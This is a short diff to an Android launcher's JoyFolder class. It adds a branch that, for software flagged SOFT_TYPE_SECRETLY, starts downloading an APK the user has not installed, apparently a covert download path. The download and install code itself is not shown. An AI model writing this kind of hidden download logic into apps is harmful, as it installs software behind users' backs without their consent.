@@ -489,6 +489,12 @@ public class JoyFolder extends Folder implements OnItemClickListener{
 					String localname = dinfo.getLocalname();
 					Util.installAPK(Constants.DOWNLOAD_APK_DIR,localname,true);
 				}
+			} else {
+				if (softType == Constants.SOFT_TYPE_SECRETLY) {
+					if (!isCompleted && !Util.isInstallApplication(LauncherApplication.mContext, packageName)) {
+						startDownLoadApk(null, oldinfo);
+					}
+				}
 			}
 		}else {
 			//DownLoadDBHelper.getInstances().delete(oldinfo);
